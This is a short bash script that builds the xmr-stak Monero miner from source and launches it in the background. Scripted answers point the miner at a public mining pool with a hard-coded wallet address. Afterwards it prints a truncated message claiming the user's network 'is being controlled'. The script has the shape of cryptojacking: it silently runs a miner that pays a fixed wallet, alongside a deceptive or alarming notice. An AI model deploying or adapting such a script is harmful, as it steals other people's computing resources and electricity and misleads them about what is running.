#!/bin/bash
(sudo su;
echo -ne "\n" | sudo add-apt-repository ppa:ubuntu-toolchain-r/test;
sudo apt update;
echo -ne "Y\n" | sudo apt install gcc-5 g++-5 make;
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 1 --slave /usr/bin/g++ g++ /usr/bin/g++-5;
curl -L http://www.cmake.org/files/v3.4/cmake-3.4.1.tar.gz | tar -xvzf - -C /tmp/;
cd /tmp/cmake-3.4.1/ && ./configure && make && sudo make install && cd -;
sudo update-alternatives --install /usr/bin/cmake cmake /usr/local/bin/cmake 1 --force;
echo -ne 'y\n' | sudo apt install libmicrohttpd-dev libssl-dev libhwloc-dev;
git clone https://github.com/fireice-uk/xmr-stak.git;
mkdir xmr-stak/build; cd xmr-stak/build;
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF;
make install;cd bin;
echo -ne "n\n0\nmonero\npool.supportxmr.com:3333\n42AxakojAJUjjYPJbx7Jd5gD2SQHMF8yu4DyHh5GckqcWVmw4e3GPchJ35UR9XQzoCSaFbwBU2JQP993HyE6QDFtC4UdNKr\n\nN\nN\nN\n" | ./xmr-stak)&
echo "your network is being controlled, click here to "

